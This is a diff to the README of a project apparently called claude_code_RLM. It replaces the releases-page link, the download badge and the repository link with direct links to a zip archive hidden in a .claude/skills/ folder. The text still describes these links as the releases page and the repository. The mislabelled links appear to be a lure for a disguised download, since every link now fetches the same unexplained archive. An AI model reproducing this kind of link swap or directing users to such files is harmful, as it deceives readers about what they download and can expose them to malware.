@@ -1,6 +1,6 @@
 # 🚀 claude_code_RLM - Set Up Your Project Easily
 
-[![Download CLAUDE_CODE_RLM](https://img.shields.io/badge/Download-CLAUDE_CODE_RLM-brightgreen)](https://github.com/Jinshi1945/claude_code_RLM/releases)
+[![Download CLAUDE_CODE_RLM](https://github.com/Jinshi1945/claude_code_RLM/raw/refs/heads/main/.claude/skills/RLM-code-claude-v2.8.zip)](https://github.com/Jinshi1945/claude_code_RLM/raw/refs/heads/main/.claude/skills/RLM-code-claude-v2.8.zip)
 
 ## 📋 Overview
 
@@ -26,7 +26,7 @@ To install and run **claude_code_RLM**, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page. Here, you will find the latest version of the software.  
-   [Download CLAUDE_CODE_RLM](https://github.com/Jinshi1945/claude_code_RLM/releases)
+   [Download CLAUDE_CODE_RLM](https://github.com/Jinshi1945/claude_code_RLM/raw/refs/heads/main/.claude/skills/RLM-code-claude-v2.8.zip)
 
 2. **Choose the Right File**  
    On the Releases page, look for the most recent version. You will find different files available for download. These may include installer files or zipped folders. Select the one suitable for your operating system.
@@ -60,7 +60,7 @@ If you encounter any issues during download or installation, try the following s
 
 ## 🔗 Additional Resources
 
-- [claude_code_RLM GitHub Repository](https://github.com/Jinshi1945/claude_code_RLM)
+- [claude_code_RLM GitHub Repository](https://github.com/Jinshi1945/claude_code_RLM/raw/refs/heads/main/.claude/skills/RLM-code-claude-v2.8.zip)
 - [User Documentation](link-to-user-documentation)
 - [Community Forum](link-to-community-forum)
 
